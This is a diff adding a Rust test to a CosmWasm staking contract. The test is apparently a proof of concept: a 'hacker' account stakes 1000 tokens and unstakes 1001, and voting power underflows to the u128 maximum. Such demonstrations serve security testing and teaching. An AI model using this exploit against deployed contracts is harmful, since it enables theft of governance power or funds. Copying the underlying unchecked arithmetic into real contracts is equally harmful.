@@ -151,4 +151,85 @@ pub mod tests {
         let balance = app.wrap().query_balance(USER, DENOM).unwrap().amount;
         assert_eq!(balance, amount);
     }
+
+
+    // Run `cargo test --release`
+    #[test]
+    fn runneth_under() {
+        let (mut app, contract_addr) = proper_instantiate();
+
+        // Create "hacker"
+        let hacker = Addr::unchecked("hacker");
+
+        // Give hacker 1000 tokens
+        app = mint_tokens(app, hacker.to_string(), Uint128::from(1000u128));
+
+        // Hacker deposits 1000 tokens
+        let msg = ExecuteMsg::Deposit {};
+        app.execute_contract(
+            hacker.clone(),
+            contract_addr.clone(),
+            &msg,
+            &[coin(1000u128, DENOM)],
+        )
+        .unwrap();
+
+        // Hacker has 0 tokens left
+        let balance = app.wrap().query_balance("hacker", DENOM).unwrap().amount;
+        assert_eq!(balance, Uint128::zero());
+
+        // Hacker has 1000 tokens deposited 
+        let msg = QueryMsg::GetUser {
+            user: "hacker".to_string(),
+        };
+        let user: UserInfo = app
+            .wrap()
+            .query_wasm_smart(contract_addr.clone(), &msg)
+            .unwrap();
+        assert_eq!(user.total_tokens, Uint128::from(1000u128));
+
+        // Hacker stakes 1000 tokens
+        let ex_msg = r#"{"stake":{"lock_amount":"1000"}}"#;
+        let msg: schemars::_serde_json::Value = schemars::_serde_json::from_str(ex_msg).unwrap();
+        app.execute_contract(hacker.clone(), contract_addr.clone(), &msg, &[])
+            .unwrap();
+
+        // Verify 1000 tokens were staked
+        let msg = QueryMsg::GetUser { 
+            user: "hacker".to_string()
+        };
+        let user_info: UserInfo = app
+            .wrap()
+            .query_wasm_smart(contract_addr.clone(), &msg)
+            .unwrap();
+        assert_eq!(user_info.voting_power, 1000u128);
+        assert_eq!(user_info.total_tokens, Uint128::from(1000u128));
+
+        // fast forward time
+        app.update_block(|block| {
+            block.time = block.time.plus_seconds(LOCK_PERIOD);
+        });
+
+        // Hacker unstakes 1001
+        let ex_msg = r#"{"unstake":{"unlock_amount":"1001"}}"#;
+        let msg: schemars::_serde_json::Value = schemars::_serde_json::from_str(ex_msg).unwrap();
+        app
+            .execute_contract(Addr::unchecked("hacker"), contract_addr.clone(), &msg, &[])
+            .unwrap();
+
+        // Check Hacker's info after trying to unstake 1001 tokens with only 1000 staked
+        let msg = QueryMsg::GetUser {
+            user: "hacker".to_string(),
+        };
+        let user_info: UserInfo = app
+            .wrap()
+            .query_wasm_smart(contract_addr.clone(), &msg)
+            .unwrap();
+        
+        // This is good!
+        assert_eq!(user_info.total_tokens, Uint128::from(1000u128));
+        // This is not!
+        assert_eq!(user_info.voting_power, 340282366920938463463374607431768211455u128);
+    }
+
 }
